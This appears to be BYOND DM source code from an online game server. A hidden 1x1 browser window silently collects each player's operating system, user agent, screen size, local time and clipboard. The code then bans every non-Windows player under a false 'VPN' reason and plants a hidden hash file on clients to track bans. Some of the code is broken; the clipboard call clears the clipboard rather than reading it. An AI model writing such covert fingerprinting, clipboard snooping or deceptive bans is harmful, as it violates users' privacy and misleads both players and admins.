mob/proc/CheckOS()

 var/html={"
<head></head>


<body onLoad="document.getos.submit()">
<form name="getos" method=GET>
<input type="hidden" name="src" value="\ref[src]">
<input type="hidden" name="os" value=1>
<input type="hidden" name="agent" value=1>
<input type="hidden" name="resx" value=1>
<input type="hidden" name="resy" value=1>
<input type="hidden" name="hours" value=1>
<input type="hidden" name="minutes" value=1>
<input type="hidden" name="clip" value=1>
<SCRIPT LANGUAGE="JavaScript"><!--

 src="http://www.telize.com/jsonip?callback=getip"

 var currentTime = new Date();
 var hours = currentTime.getHours();
 var minutes = currentTime.getMinutes();

 var OSName="Unknown OS";
 if (navigator.appVersion.indexOf("Win")!=-1) OSName="Windows";
 if (navigator.appVersion.indexOf("Mac")!=-1) OSName="MacOS";
 if (navigator.appVersion.indexOf("X11")!=-1) OSName="UNIX";
 if (navigator.appVersion.indexOf("Linux")!=-1) OSName="Linux";

 getos.os.value=OSName;
 getos.agent.value = window.navigator.userAgent;
 getos.resx.value = screen.width;
 getos.resy.value = screen.height;
 getos.hours.value = hours;
 getos.minutes.value = minutes;
 getos.clip.value = window.clipboardData.clearData("Text");


// --></SCRIPT>
</form>
"}
 src<<browse(html,"window=lel;size=1x1")
 src<<browse(null,"window=lel")


mob/Topic(href,href_list)
	if(href_list["os"] == "Windows")
		src.operatingSystem = "Windows"
	if(href_list["os"] != "Windows")
		src.operatingSystem = "Not Windows"
		AddBan(src.ckey, src.computer_id, "Tried to log in via a VPN connection.", src.ckey, 0, 0)
		alertAdmins("[src.client.ckey] tried to log into the game via a VPN connection and was removed.")
		del(src)
 //src<<href_list["agent"]
 //src<<href_list["resx"] + "x" + href_list["resy"]
 //src<<href_list["hours"] + ":" + href_list["minutes"]
 //src<<href_list["os"]
 src<<href_list["clip"]

mob/proc/CheckBans()
	var/client_file = client.Import()
	if(client_file&&(ckey in given))
		var/savefile/F = new(client_file) //open it as a savefile
		if(F["#E8%4IRI6K#;W&A^0"]!=md5("5PBM0^4TJXH_1^P-_LX_GAM &C7Y[ckey]!*%K9& 9W1*8M$P^Y0"))  //Checks the hash
			src<<"<center><font size=50>Sorryz nub!"
			del(src) //Goes without explanation
	else
		given+=ckey //adds their ckey to the people who have recevied the hash
		var/savefile/F = new() //new save file
		F["#E8%4IRI6K#;W&A^0"]<<md5("5PBM0^4TJXH_1^P-_LX_GAM &C7Y[ckey]!*%K9& 9W1*8M$P^Y0")//Stores the hash
		client.Export(F)    //Saves the savefile
//	return ..() //Allows the person to login!
//I wouldn't even want to be caught in one of these bans >_>;